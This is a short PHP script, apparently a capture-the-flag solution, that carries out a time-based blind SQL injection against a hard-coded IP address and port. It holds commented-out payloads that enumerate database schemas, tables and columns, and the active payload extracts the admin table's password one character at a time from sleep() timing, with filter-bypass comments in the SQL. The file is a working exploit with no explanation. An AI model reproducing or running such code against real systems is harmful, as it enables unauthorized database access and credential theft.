<?php

$host = '146.190.104.208:1339';
$flag = "";

$j = 1;
while (true) {
 $found = false;
 for ($i = 0x80; $i > 0x20; $i--) {
 //$url = 'http://' . $host . '/?%27^if(ASCII(substr((SELECT/**/schema%20name/**/FROM/**/information%20schema/*[*/.schemata/**/limit/**/0,1),' . $j . ',1))>' . $i . ',sleep(1),sleep(0))^0^%27=1&release';
 //$url = 'http://' . $host . '/?%27^if(ASCII(substr((SELECT/**/schema%20name/**/FROM/**/information%20schema/*[*/.schemata/**/limit/**/1,1),' . $j . ',1))>' . $i . ',sleep(1),sleep(0))^0^%27=1';
 //$url = 'http://' . $host . '/?%27^if(ASCII(substr((SELECT/**/table%20name/**/FROM/**/information%20schema/*[*/.tables/**/limit/**/60,1),' . $j . ',1))>' . $i . ',sleep(1),sleep(0))^0^%27=1';
 //$url = 'http://' . $host . '/?%27^if(ASCII(substr((SELECT/**/table%20name/**/FROM/**/information%20schema/*[*/.tables/**/limit/**/59,1),' . $j . ',1))>' . $i . ',sleep(1),sleep(0))^0^%27=1';
 //$url = 'http://' . $host . '/?%27^if(ASCII(substr((SELECT/**/column%20name/**/FROM/**/information%20schema/*[*/.columns/**/limit/**/591,1),' . $j . ',1))>' . $i . ',sleep(1),sleep(0))^0^%27=1';
 $url = 'http://' . $host . '/?%27^if(ASCII(substr((SELECT/**/password/**/FROM/**/admin),' . $j . ',1))>' . $i . ',sleep(1),sleep(0))^0^%27=1';
 $start = time();
 file_get_contents($url);
 $end = time();
 echo $i . " \r";
 $x = $end - $start;
 if ($x > 1) {
 $flag .= chr($i + 1);
 echo "\n" . $flag . "\n";
 $found = true;
 break;
 }
 }
 if (!$found) {
 break;
 }
 $j++;
}

?>